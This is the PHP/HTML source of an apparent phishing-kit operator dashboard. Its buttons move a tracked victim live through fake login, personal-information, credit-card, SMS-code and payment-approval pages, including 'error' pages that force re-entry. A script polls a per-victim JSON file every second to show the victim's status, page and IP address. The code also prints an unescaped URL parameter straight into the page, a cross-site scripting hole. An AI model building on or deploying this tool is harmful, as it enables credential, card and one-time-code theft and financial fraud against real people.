<?php 
    error_reporting(0);
    session_start();
    if(!isset($_GET['id_user']) OR empty($_GET['id_user'])){
        exit("INVALID REQUESTS. PLEASE ACCESS THIS PAGE FROM A VALID LINK");
    }
    $_SESSION['vip'] = $_GET['id_user'];
    $target = $_GET['id_user'];
    $file_name = str_replace('.','-', $target);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/panel.css">
    <!-- Font Awesome Library -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- JQ -->
    <script src="../js/jquery-3.6.0.min.js"></script>    
    <!-- Favicon -->
    <link rel="icon" href="img/favicon.png">
    <link rel="shortcut" href="img/favicon.png">
    <link rel="appel-touch-icon" href="img/favicon.png">
    <title>Dashboard Control Users - Page</title>
</head>
<body id="beforeUserData" class="">
    <!-- Start Nav Bar -->
    <nav>
        <div class="container">
            <div class="content-nav">
                <h3><img src="img/icon.jpg" alt=""> Admin Dashboard</h3> 
            </div>
        </div>
    </nav>
    <!-- End Nav Bar -->

    <!-- Start Buttons Control Users -->
    <div class="container-buttons-control-user">
        <div class="container">
            <h3 class="titles">Buttons Control Users</h3>
            <form action="./check-action.php" method="post">
                <input type="hidden" name="step" value="panel">
                <input type="hidden" name="id_vip" value="<?php echo $_GET['id_user'];?>">
                <button type="submit" name="to" class="buttons-control-users button-valid" value="login">Login</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="login-error">Error Login Page</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="information">Information Page</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="information-error">Error Information Page</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="credit-card">Credit Card</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="credit-card-error">Error Credit Card Page</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="sms">SMS Page</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="sms-error">Error SMS Page</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="accept-app">Approve Payment Page</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="accept-app-error">Error Approve Payment Page</button>
                <button type="submit" name="to" class="buttons-control-users button-comfirmed" value="confirmed">Thanks Page</button>
                <button type="submit" name="to" class="buttons-control-users button-logout" value="logout">Logout</button>
            </form>
            <div class="parent-buttons-events">
                <h3 class="titles">Setting Buttons</h3>
                <button id="updatePage" class="buttons-control-users button-1">Realod</button>
            </div>
        </div>
    </div>
    <!-- Start User Data -->

    <!-- Start Table User Information -->
    <div class="container parent-table" id="dashboard" >
        <h3 class="titles">User Information</h3>
        <table class="table">
            <thead>
                <tr>
                    <th>Status</th>
                    <th>Page</th>
                    <th>IP Address</th>
                    <th>Time</th>
                </tr>
            </thead>
            <tbody id="tableBody" class="dynamic-section">

            </tbody>
        </table>
    </div>
    <!-- End Table User Information -->

    <!-- Script Js -->
    <script>
        function fetchAndUpdateContent(){$("#tableBody");$.ajax({url:"../panel/storage/<?php echo $file_name?>.json",type:"GET",dataType:"json",success:function(t){updateTable(t)},error:function(t,e,a){console.error("Error fetching data:",a)}}),setTimeout(fetchAndUpdateContent,1e3)}function updateTable(t){let e=$("#tableBody");e.empty();let a=$("<tr>"),n=$("<td>").html(t.userStatus),d=$("<td>").text(t.current_page),p=$("<td>").text(t.user_ip),o=$("<td>").text(t.timestamp);a.append(n,d,p,o),e.append(a)}fetchAndUpdateContent();const updatePage=$("#updatePage");updatePage.click(function(){location.reload()});
    </script>

</body>
</html>